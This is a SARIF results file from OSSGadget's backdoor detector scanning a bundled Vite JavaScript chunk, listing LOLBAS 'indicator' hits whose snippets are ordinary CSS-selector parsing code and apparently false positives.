{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 6137,
                  "startColumn": 47,
                  "endLine": 6137,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                'Selector \"' +\n                  rule.selector +\n                  '\" is not pure ' +\n                  \"(pure selectors must contain at least one local class or id)\"\n              );\n            }\n\n",
                    "rendered": {
                      "text": "                'Selector \"' +\n                  rule.selector +\n                  '\" is not pure ' +\n                  \"(pure selectors must contain at least one local class or id)\"\n              );\n            }\n\n",
                      "markdown": "`                'Selector \"' +\n                  rule.selector +\n                  '\" is not pure ' +\n                  \"(pure selectors must contain at least one local class or id)\"\n              );\n            }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 3957,
                  "startColumn": 3,
                  "endLine": 3957,
                  "endColumn": 7,
                  "snippet": {
                    "text": "tokenTypes.ampersand = ampersand;\nvar asterisk = 42; // `*`.charCodeAt(0);\ntokenTypes.asterisk = asterisk;\nvar at = 64; // `@`.charCodeAt(0);\ntokenTypes.at = at;\nvar comma = 44; // `,`.charCodeAt(0);\ntokenTypes.comma = comma;\n",
                    "rendered": {
                      "text": "tokenTypes.ampersand = ampersand;\nvar asterisk = 42; // `*`.charCodeAt(0);\ntokenTypes.asterisk = asterisk;\nvar at = 64; // `@`.charCodeAt(0);\ntokenTypes.at = at;\nvar comma = 44; // `,`.charCodeAt(0);\ntokenTypes.comma = comma;\n",
                      "markdown": "`tokenTypes.ampersand = ampersand;\nvar asterisk = 42; // `*`.charCodeAt(0);\ntokenTypes.asterisk = asterisk;\nvar at = 64; // `@`.charCodeAt(0);\ntokenTypes.at = at;\nvar comma = 44; // `,`.charCodeAt(0);\ntokenTypes.comma = comma;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 5,
                  "endLine": 65,
                  "endColumn": 10,
                  "snippet": {
                    "text": "});\nunquote$1.default = unquote;\n// copied from https://github.com/lakenen/node-unquote\nconst reg = /['\"]/;\n\nfunction unquote(str) {\n  if (!str) {\n",
                    "rendered": {
                      "text": "});\nunquote$1.default = unquote;\n// copied from https://github.com/lakenen/node-unquote\nconst reg = /['\"]/;\n\nfunction unquote(str) {\n  if (!str) {\n",
                      "markdown": "`});\nunquote$1.default = unquote;\n// copied from https://github.com/lakenen/node-unquote\nconst reg = /['\"]/;\n\nfunction unquote(str) {\n  if (!str) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 6207,
                  "startColumn": 9,
                  "endLine": 6207,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n",
                    "rendered": {
                      "text": "        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n",
                      "markdown": "`        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 6199,
                  "startColumn": 3,
                  "endLine": 6199,
                  "endColumn": 9,
                  "snippet": {
                    "text": "      );\n    }\n\n    node = node.first;\n\n    if (node.type !== \"class\") {\n      // 'id' is not possible, because you can't compose ids\n",
                    "rendered": {
                      "text": "      );\n    }\n\n    node = node.first;\n\n    if (node.type !== \"class\") {\n      // 'id' is not possible, because you can't compose ids\n",
                      "markdown": "`      );\n    }\n\n    node = node.first;\n\n    if (node.type !== \"class\") {\n      // 'id' is not possible, because you can't compose ids\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 6194,
                  "startColumn": 9,
                  "endLine": 6194,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n",
                    "rendered": {
                      "text": "        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n",
                      "markdown": "`        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 6187,
                  "startColumn": 3,
                  "endLine": 6187,
                  "endColumn": 9,
                  "snippet": {
                    "text": "      );\n    }\n\n    node = node.first;\n\n    if (node.type !== \"selector\" || node.length !== 1) {\n      throw new Error(\n",
                    "rendered": {
                      "text": "      );\n    }\n\n    node = node.first;\n\n    if (node.type !== \"selector\" || node.length !== 1) {\n      throw new Error(\n",
                      "markdown": "`      );\n    }\n\n    node = node.first;\n\n    if (node.type !== \"selector\" || node.length !== 1) {\n      throw new Error(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 6182,
                  "startColumn": 9,
                  "endLine": 6182,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n",
                    "rendered": {
                      "text": "        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n",
                      "markdown": "`        'composition is only allowed when selector is single :local class name not in \"' +\n          root +\n          '\", \"' +\n          node +\n          '\" is weird'\n      );\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 6171,
                  "startColumn": 3,
                  "endLine": 6171,
                  "endColumn": 9,
                  "snippet": {
                    "text": "      );\n    }\n\n    node = node.nodes[0];\n\n    if (\n      node.type !== \"pseudo\" ||\n",
                    "rendered": {
                      "text": "      );\n    }\n\n    node = node.nodes[0];\n\n    if (\n      node.type !== \"pseudo\" ||\n",
                      "markdown": "`      );\n    }\n\n    node = node.nodes[0];\n\n    if (\n      node.type !== \"pseudo\" ||\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5830,
                  "startColumn": 9,
                  "endLine": 5830,
                  "endColumn": 15,
                  "snippet": {
                    "text": "          const innerNode = node.clone();\n          innerNode.spaces = { before: \"\", after: \"\" };\n\n          node = selectorParser$1.pseudo({\n            value: \":local\",\n            nodes: [innerNode],\n            spaces: node.spaces,\n",
                    "rendered": {
                      "text": "          const innerNode = node.clone();\n          innerNode.spaces = { before: \"\", after: \"\" };\n\n          node = selectorParser$1.pseudo({\n            value: \":local\",\n            nodes: [innerNode],\n            spaces: node.spaces,\n",
                      "markdown": "`          const innerNode = node.clone();\n          innerNode.spaces = { before: \"\", after: \"\" };\n\n          node = selectorParser$1.pseudo({\n            value: \":local\",\n            nodes: [innerNode],\n            spaces: node.spaces,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5774,
                  "startColumn": 11,
                  "endLine": 5774,
                  "endColumn": 17,
                  "snippet": {
                    "text": "              transform(childNode, childContext)\n            );\n\n            node = node.clone();\n            node.nodes = normalizeNodeArray(newNodes);\n\n            if (childContext.hasLocals) {\n",
                    "rendered": {
                      "text": "              transform(childNode, childContext)\n            );\n\n            node = node.clone();\n            node.nodes = normalizeNodeArray(newNodes);\n\n            if (childContext.hasLocals) {\n",
                      "markdown": "`              transform(childNode, childContext)\n            );\n\n            node = node.clone();\n            node.nodes = normalizeNodeArray(newNodes);\n\n            if (childContext.hasLocals) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5759,
                  "startColumn": 11,
                  "endLine": 5759,
                  "endColumn": 17,
                  "snippet": {
                    "text": "              last.spaces = { before: last.spaces.before, after };\n            }\n\n            node = newNodes;\n\n            break;\n          } else {\n",
                    "rendered": {
                      "text": "              last.spaces = { before: last.spaces.before, after };\n            }\n\n            node = newNodes;\n\n            break;\n          } else {\n",
                      "markdown": "`              last.spaces = { before: last.spaces.before, after };\n            }\n\n            node = newNodes;\n\n            break;\n          } else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5745,
                  "startColumn": 22,
                  "endLine": 5746,
                  "snippet": {
                    "text": "              explicit: true,\n            };\n\n            newNodes = node\n              .map((childNode) => transform(childNode, childContext))\n              .reduce((acc, next) => acc.concat(next.nodes), []);\n\n            if (newNodes.length) {\n",
                    "rendered": {
                      "text": "              explicit: true,\n            };\n\n            newNodes = node\n              .map((childNode) => transform(childNode, childContext))\n              .reduce((acc, next) => acc.concat(next.nodes), []);\n\n            if (newNodes.length) {\n",
                      "markdown": "`              explicit: true,\n            };\n\n            newNodes = node\n              .map((childNode) => transform(childNode, childContext))\n              .reduce((acc, next) => acc.concat(next.nodes), []);\n\n            if (newNodes.length) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5699,
                  "startColumn": 7,
                  "endLine": 5699,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      case \"selector\": {\n        newNodes = node.map((childNode) => transform(childNode, context));\n\n        node = node.clone();\n        node.nodes = normalizeNodeArray(newNodes);\n        break;\n      }\n",
                    "rendered": {
                      "text": "      case \"selector\": {\n        newNodes = node.map((childNode) => transform(childNode, context));\n\n        node = node.clone();\n        node.nodes = normalizeNodeArray(newNodes);\n        break;\n      }\n",
                      "markdown": "`      case \"selector\": {\n        newNodes = node.map((childNode) => transform(childNode, context));\n\n        node = node.clone();\n        node.nodes = normalizeNodeArray(newNodes);\n        break;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5679,
                  "startColumn": 15,
                  "endLine": 5679,
                  "endColumn": 21,
                  "snippet": {
                    "text": "          } else if (resultingGlobal !== nContext.global) {\n            throw new Error(\n              'Inconsistent rule global/local result in rule \"' +\n                node +\n                '\" (multiple selectors must result in the same mode for the rule)'\n            );\n          }\n",
                    "rendered": {
                      "text": "          } else if (resultingGlobal !== nContext.global) {\n            throw new Error(\n              'Inconsistent rule global/local result in rule \"' +\n                node +\n                '\" (multiple selectors must result in the same mode for the rule)'\n            );\n          }\n",
                      "markdown": "`          } else if (resultingGlobal !== nContext.global) {\n            throw new Error(\n              'Inconsistent rule global/local result in rule \"' +\n                node +\n                '\" (multiple selectors must result in the same mode for the rule)'\n            );\n          }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5535,
                  "startColumn": 15,
                  "endLine": 5535,
                  "endColumn": 21,
                  "snippet": {
                    "text": "var _IS_TYPE;\nvar IS_TYPE = (_IS_TYPE = {}, _IS_TYPE[_types.ATTRIBUTE] = true, _IS_TYPE[_types.CLASS] = true, _IS_TYPE[_types.COMBINATOR] = true, _IS_TYPE[_types.COMMENT] = true, _IS_TYPE[_types.ID] = true, _IS_TYPE[_types.NESTING] = true, _IS_TYPE[_types.PSEUDO] = true, _IS_TYPE[_types.ROOT] = true, _IS_TYPE[_types.SELECTOR] = true, _IS_TYPE[_types.STRING] = true, _IS_TYPE[_types.TAG] = true, _IS_TYPE[_types.UNIVERSAL] = true, _IS_TYPE);\nfunction isNode(node) {\n  return typeof node === \"object\" && IS_TYPE[node.type];\n}\nfunction isNodeType(type, node) {\n  return isNode(node) && node.type === type;\n",
                    "rendered": {
                      "text": "var _IS_TYPE;\nvar IS_TYPE = (_IS_TYPE = {}, _IS_TYPE[_types.ATTRIBUTE] = true, _IS_TYPE[_types.CLASS] = true, _IS_TYPE[_types.COMBINATOR] = true, _IS_TYPE[_types.COMMENT] = true, _IS_TYPE[_types.ID] = true, _IS_TYPE[_types.NESTING] = true, _IS_TYPE[_types.PSEUDO] = true, _IS_TYPE[_types.ROOT] = true, _IS_TYPE[_types.SELECTOR] = true, _IS_TYPE[_types.STRING] = true, _IS_TYPE[_types.TAG] = true, _IS_TYPE[_types.UNIVERSAL] = true, _IS_TYPE);\nfunction isNode(node) {\n  return typeof node === \"object\" && IS_TYPE[node.type];\n}\nfunction isNodeType(type, node) {\n  return isNode(node) && node.type === type;\n",
                      "markdown": "`var _IS_TYPE;\nvar IS_TYPE = (_IS_TYPE = {}, _IS_TYPE[_types.ATTRIBUTE] = true, _IS_TYPE[_types.CLASS] = true, _IS_TYPE[_types.COMBINATOR] = true, _IS_TYPE[_types.COMMENT] = true, _IS_TYPE[_types.ID] = true, _IS_TYPE[_types.NESTING] = true, _IS_TYPE[_types.PSEUDO] = true, _IS_TYPE[_types.ROOT] = true, _IS_TYPE[_types.SELECTOR] = true, _IS_TYPE[_types.STRING] = true, _IS_TYPE[_types.TAG] = true, _IS_TYPE[_types.UNIVERSAL] = true, _IS_TYPE);\nfunction isNode(node) {\n  return typeof node === \"object\" && IS_TYPE[node.type];\n}\nfunction isNodeType(type, node) {\n  return isNode(node) && node.type === type;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5094,
                  "startColumn": 8,
                  "endLine": 5094,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\t          sourceIndex: sourceIndex\n\t        };\n\t        unescapeProp(tagOpts, \"value\");\n\t        node = new _tag[\"default\"](tagOpts);\n\t      }\n\t      _this5.newNode(node, namespace);\n\t      // Ensure that the namespace is used only once\n",
                    "rendered": {
                      "text": "\t          sourceIndex: sourceIndex\n\t        };\n\t        unescapeProp(tagOpts, \"value\");\n\t        node = new _tag[\"default\"](tagOpts);\n\t      }\n\t      _this5.newNode(node, namespace);\n\t      // Ensure that the namespace is used only once\n",
                      "markdown": "`\t          sourceIndex: sourceIndex\n\t        };\n\t        unescapeProp(tagOpts, \"value\");\n\t        node = new _tag[\"default\"](tagOpts);\n\t      }\n\t      _this5.newNode(node, namespace);\n\t      // Ensure that the namespace is used only once\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5086,
                  "startColumn": 8,
                  "endLine": 5086,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\t          source: source,\n\t          sourceIndex: sourceIndex\n\t        };\n\t        node = new _id[\"default\"](unescapeProp(idOpts, \"value\"));\n\t      } else {\n\t        var tagOpts = {\n\t          value: value,\n",
                    "rendered": {
                      "text": "\t          source: source,\n\t          sourceIndex: sourceIndex\n\t        };\n\t        node = new _id[\"default\"](unescapeProp(idOpts, \"value\"));\n\t      } else {\n\t        var tagOpts = {\n\t          value: value,\n",
                      "markdown": "`\t          source: source,\n\t          sourceIndex: sourceIndex\n\t        };\n\t        node = new _id[\"default\"](unescapeProp(idOpts, \"value\"));\n\t      } else {\n\t        var tagOpts = {\n\t          value: value,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5079,
                  "startColumn": 8,
                  "endLine": 5079,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\t          source: source,\n\t          sourceIndex: sourceIndex\n\t        };\n\t        node = new _className[\"default\"](unescapeProp(classNameOpts, \"value\"));\n\t      } else if (~hasId.indexOf(ind)) {\n\t        var idOpts = {\n\t          value: value.slice(1),\n",
                    "rendered": {
                      "text": "\t          source: source,\n\t          sourceIndex: sourceIndex\n\t        };\n\t        node = new _className[\"default\"](unescapeProp(classNameOpts, \"value\"));\n\t      } else if (~hasId.indexOf(ind)) {\n\t        var idOpts = {\n\t          value: value.slice(1),\n",
                      "markdown": "`\t          source: source,\n\t          sourceIndex: sourceIndex\n\t        };\n\t        node = new _className[\"default\"](unescapeProp(classNameOpts, \"value\"));\n\t      } else if (~hasId.indexOf(ind)) {\n\t        var idOpts = {\n\t          value: value.slice(1),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 4813,
                  "startColumn": 6,
                  "endLine": 4813,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t      } else {\n\t        raws.value = _rawSpace2;\n\t      }\n\t      node = new _combinator[\"default\"]({\n\t        value: ' ',\n\t        source: getTokenSourceSpan(firstToken, this.tokens[this.position - 1]),\n\t        sourceIndex: firstToken[_tokenize.FIELDS.START_POS],\n",
                    "rendered": {
                      "text": "\t      } else {\n\t        raws.value = _rawSpace2;\n\t      }\n\t      node = new _combinator[\"default\"]({\n\t        value: ' ',\n\t        source: getTokenSourceSpan(firstToken, this.tokens[this.position - 1]),\n\t        sourceIndex: firstToken[_tokenize.FIELDS.START_POS],\n",
                      "markdown": "`\t      } else {\n\t        raws.value = _rawSpace2;\n\t      }\n\t      node = new _combinator[\"default\"]({\n\t        value: ' ',\n\t        source: getTokenSourceSpan(firstToken, this.tokens[this.position - 1]),\n\t        sourceIndex: firstToken[_tokenize.FIELDS.START_POS],\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 4775,
                  "startColumn": 6,
                  "endLine": 4775,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t    if (this.isNamedCombinator()) {\n\t      node = this.namedCombinator();\n\t    } else if (this.currToken[_tokenize.FIELDS.TYPE] === tokens.combinator) {\n\t      node = new _combinator[\"default\"]({\n\t        value: this.content(),\n\t        source: getTokenSource(this.currToken),\n\t        sourceIndex: this.currToken[_tokenize.FIELDS.START_POS]\n",
                    "rendered": {
                      "text": "\t    if (this.isNamedCombinator()) {\n\t      node = this.namedCombinator();\n\t    } else if (this.currToken[_tokenize.FIELDS.TYPE] === tokens.combinator) {\n\t      node = new _combinator[\"default\"]({\n\t        value: this.content(),\n\t        source: getTokenSource(this.currToken),\n\t        sourceIndex: this.currToken[_tokenize.FIELDS.START_POS]\n",
                      "markdown": "`\t    if (this.isNamedCombinator()) {\n\t      node = this.namedCombinator();\n\t    } else if (this.currToken[_tokenize.FIELDS.TYPE] === tokens.combinator) {\n\t      node = new _combinator[\"default\"]({\n\t        value: this.content(),\n\t        source: getTokenSource(this.currToken),\n\t        sourceIndex: this.currToken[_tokenize.FIELDS.START_POS]\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 4773,
                  "startColumn": 6,
                  "endLine": 4773,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\t    }\n\t    var node;\n\t    if (this.isNamedCombinator()) {\n\t      node = this.namedCombinator();\n\t    } else if (this.currToken[_tokenize.FIELDS.TYPE] === tokens.combinator) {\n\t      node = new _combinator[\"default\"]({\n\t        value: this.content(),\n",
                    "rendered": {
                      "text": "\t    }\n\t    var node;\n\t    if (this.isNamedCombinator()) {\n\t      node = this.namedCombinator();\n\t    } else if (this.currToken[_tokenize.FIELDS.TYPE] === tokens.combinator) {\n\t      node = new _combinator[\"default\"]({\n\t        value: this.content(),\n",
                      "markdown": "`\t    }\n\t    var node;\n\t    if (this.isNamedCombinator()) {\n\t      node = this.namedCombinator();\n\t    } else if (this.currToken[_tokenize.FIELDS.TYPE] === tokens.combinator) {\n\t      node = new _combinator[\"default\"]({\n\t        value: this.content(),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 4727,
                  "startColumn": 10,
                  "endLine": 4727,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\t      if (name !== nameRaw) {\n\t        raws.value = \"/\" + nameRaw + \"/\";\n\t      }\n\t      var node = new _combinator[\"default\"]({\n\t        value: \"/\" + name + \"/\",\n\t        source: getSource(this.currToken[_tokenize.FIELDS.START_LINE], this.currToken[_tokenize.FIELDS.START_COL], this.tokens[this.position + 2][_tokenize.FIELDS.END_LINE], this.tokens[this.position + 2][_tokenize.FIELDS.END_COL]),\n\t        sourceIndex: this.currToken[_tokenize.FIELDS.START_POS],\n",
                    "rendered": {
